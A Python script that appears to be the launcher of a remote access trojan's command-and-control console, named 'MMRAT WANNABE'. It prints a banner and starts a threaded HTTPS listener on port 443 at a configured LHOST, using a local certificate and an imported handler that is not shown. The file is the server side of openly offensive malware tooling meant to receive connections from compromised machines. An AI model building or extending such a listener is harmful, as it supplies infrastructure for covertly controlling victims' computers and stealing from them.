from http.server import HTTPServer
from banner_generator import generate_banner
from http_server import MyHandler
import threading
import ssl

from settings import LHOST

text = "MMRAT WANNABE"
banner = generate_banner(text)
print(banner)

print("Loading console...")


# Define a function to start the HTTP server in a separate thread
def start_server():
    print('http server is starting...')  

    #ip and port of server  
    #by default https server port is 443  
    server_address = (LHOST, 443)  
    # Path to your SSL/TLS certificate and private key files
    certfile = 'https_server_key/domain.crt'
    keyfile = 'https_server_key/domain.key'
    
    httpd = HTTPServer(server_address, MyHandler)  

    # sslctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    sslctx.check_hostname = False # If set to True, only the hostname that matches the certificate will be accepted
    sslctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
    httpd.socket = sslctx.wrap_socket(httpd.socket, server_side=True)

    print('http server is running...')  
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("server failed")

    httpd.server_close()
    print('Server stopped.')



# Create a new thread and start the HTTP server in that thread
server_thread = threading.Thread(target=start_server)

# Start the threads.
server_thread.start()
